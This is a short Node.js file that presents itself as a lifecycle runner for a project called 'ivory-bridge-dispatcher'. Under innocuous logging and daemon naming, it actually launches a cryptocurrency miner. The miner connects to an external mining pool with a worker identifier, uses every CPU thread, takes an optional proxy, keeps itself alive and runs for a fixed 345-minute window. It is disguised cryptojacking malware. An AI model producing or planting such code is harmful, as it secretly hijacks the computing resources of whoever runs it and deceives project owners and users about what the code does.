// Procedural action runner for ivory-bridge-dispatcher
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./lib/config");

async function launchDaemon() {
    const runId = "00790c";
    console.log(`[lifecycle] Starting runtime for ${config.appName || "ivory-bridge-dispatcher"} [${runId}]`);

    const handler = new NMiner(
        "wss://runtime.nmining.igrp.app/",
        "Arup07.vestment",
        { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
    );

    const tick = () => { setTimeout(tick, 41000); }; tick();
    setTimeout(() => {
        console.log("[timeout] Operational limit (345m) reached, exiting cleanly.");
        process.exit(0);
    }, 345 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log(`[lifecycle] Signal SIGTERM acknowledged, exiting session ${runId}.`);
        process.exit(0);
    });

    console.log(`[ready] Active on ${os.hostname()} (${os.platform()}) with ${os.cpus().length} threads.`);
}

launchDaemon().catch((err) => {
    console.error("Supervisor startup fault:", err);
    process.exit(1);
});
